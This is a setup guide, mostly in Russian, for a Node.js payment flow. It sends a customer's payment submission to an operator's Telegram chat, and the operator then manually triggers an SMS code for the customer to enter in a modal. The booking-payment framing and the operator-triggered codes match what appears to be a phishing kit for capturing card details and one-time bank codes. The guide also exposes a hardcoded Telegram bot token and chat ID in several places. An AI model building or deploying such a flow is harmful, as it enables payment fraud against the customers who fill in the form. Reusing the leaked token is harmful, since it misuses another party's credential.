# 📱 SMS Verification Setup Guide

## Overview
Интеграция двусторонней связи с Telegram ботом для подтверждения оплаты через SMS.

## 🔄 Flow Process

1. **Клиент заполняет** форму оплаты и нажимает "Pay"
2. **Система отправляет** уведомление в Telegram с кнопками
3. **Администратор нажимает** "📱 Отправить SMS"
4. **Клиент получает** модальное окно для ввода SMS кода
5. **После ввода** правильного кода - оплата завершается

## 🚀 Setup Instructions

### 1. Install Dependencies
```bash
npm install express cors body-parser
```

### 2. Setup Telegram Webhook
Настройте webhook URL для вашего домена:

```bash
curl -X POST "https://api.telegram.org/bot7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo/setWebhook" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://your-domain.com/webhook"}'
```

### 3. Start Webhook Server
```bash
node webhook-server.js
```

### 4. Update webhook-server.js
Замените `https://your-domain.com/webhook` на ваш реальный домен.

## 📁 File Structure

```
├── webhook-server.js          # Node.js webhook server
├── payment.js (v13)          # Modified payment processing  
├── payment-sms.js            # SMS verification modal
├── confirmation.js           # Updated confirmation page
└── SMS_SETUP.md              # This file
```

## 🔧 Configuration

### Telegram Bot Config
```javascript
const TELEGRAM_CONFIG = {
  BOT_TOKEN: '7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo',
  CHAT_ID: '2063086506',
  WEBHOOK_URL: 'https://your-domain.com/webhook'
};
```

## 🎯 API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/webhook` | POST | Telegram webhook |
| `/api/payment/create-session` | POST | Create payment session |
| `/api/payment/events/:bookingId` | GET | SSE stream |
| `/api/payment/verify-sms` | POST | Verify SMS code |

## 🧪 Testing

### 1. Test Webhook
```bash
curl -X POST http://localhost:3001/webhook \
  -H "Content-Type: application/json" \
  -d '{"message": {"text": "test"}}'
```

### 2. Test Payment Flow
1. Go to payment page
2. Fill form and click "Pay" 
3. Check Telegram for notification with buttons
4. Click "📱 Отправить SMS"
5. Enter SMS code in modal
6. Verify success

## 🛠️ Production Deployment

### Railway/Heroku
```json
{
  "scripts": {
    "start": "node webhook-server.js"
  },
  "engines": {
    "node": ">=14.0.0"
  }
}
```

### Environment Variables
```bash
PORT=3001
BOT_TOKEN=7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo
CHAT_ID=2063086506
WEBHOOK_URL=https://your-domain.com/webhook
```

## 📱 SMS Code Generation

SMS коды генерируются автоматически (6-значные числа) и действительны 5 минут.

Пример: `123456`

## 🔐 Security Features

- ✅ Session expiration (5 minutes)
- ✅ Unique booking IDs
- ✅ Input validation
- ✅ Error handling
- ✅ Automatic cleanup

## 🐛 Troubleshooting

### Webhook не получает сообщения
```bash
# Check webhook status
curl "https://api.telegram.org/bot7808830885:AAHFkGTaOylnQ99RrNolU5UgjEgo2gxFrqo/getWebhookInfo"
```

### SSE connection issues
- Check CORS headers
- Verify endpoint accessibility
- Check browser console for errors

### SMS modal не появляется
- Убедитесь что `payment-sms.js` загружен
- Проверьте что сервер запущен
- Проверьте консоль браузера

## 🎉 Success!
После настройки у вас будет полностью рабочая система SMS подтверждения с красивым UI и real-time обновлениями!